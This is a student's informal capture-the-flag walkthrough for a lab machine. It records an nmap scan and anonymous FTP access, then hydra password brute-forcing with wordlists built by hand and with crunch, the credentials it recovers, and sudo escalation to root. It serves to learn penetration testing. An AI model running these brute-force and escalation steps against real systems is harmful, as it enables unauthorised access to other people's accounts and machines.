2025-04-02 00:29

Status:

Tags:

# CTF by hacker school

# step1.  do nmap scan 

sudo nmap -Pn -n -p- 10.10.10.7 

Nmap scan report for 10.10.10.7
Host is up (0.00017s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
1515/tcp open  ifor-protocol
3535/tcp open  ms-la
MAC Address: 08:00:27:09:75:7F (Oracle VirtualBox virtual NIC)

check for anonymous login 

nmap --script ftp-vsftpd-backdoor.nse -p21 10.10.10.7 

got to see that port 21 is open 

ftp 10.10.10.7

# step2. 
ftp 10.10.10.7
username: anonymous 
password: 
# step 3: 
check whether you are able to upload file or download file 

Only download file is enable and upload is disable
 
 and read that file 
 note.txt 
(hint) Try to login as Jack

# step4:  
run tcp with port 1515

check for any hit or check for any odd thing
like Cyberspace

 then run hydra  
 and create word list containing 
 nano hbox 
	 Jack
	Cyberspace
	HackerSchool
	hackerschool
	jack
	Cyberspace 

and then run 
 hydra -L hbox -P hbox   ftp://10.10.10.7
[21][ftp] host: 10.10.10.7   login: jack   password: Cyberspace


# step: 5
login: jack 
password: Cyberspace 

then read / cat note 
next step login as goblin 
and create pssword list and password contain 4 4 with {a,c1,5}, using crunch 

crunch 4 4 -p ac15 > gob 
			15ac
			15ca
			1a5c
			1ac5
			1c5a
			1ca5
			51ac
			51ca
			5a1c
			5ac1
			5c1a
			5ca1
			a15c
			a1c5
			a51c
			a5c1
			ac15
			ac51
			c15a
			c1a5
			c51a
			c5a1
			ca15
			ca51

then run hydra 
hydra -l goblin  -P gob   ftp://10.10.10.7
	[21][ftp] host: 10.10.10.7   login: goblin   password: ca51
 
# step: 6

login: goblin  
password: ca51

then cat note 
(hint) to be find final.sh 
next step root 

# step: 7
to be root user use 
	sudo  -i 

step: final 
to locate the "final.sh " use find command 
find / -name "final.sh"  
result : /usr/share/hs/final.sh
cd /usr/share/hs/final.sh
cat final.sh

solution by sir 
missed things by me 
use vsftp 2.0.8 ftp hack and use CEV and then perform the enumeration 
create word list using cewl and use https 10.10.10.7(missed)
sudo root expolit code -final.sh 

2>/dev/null (trash )
run final.sh 
create file in 
cd temp





### Referees
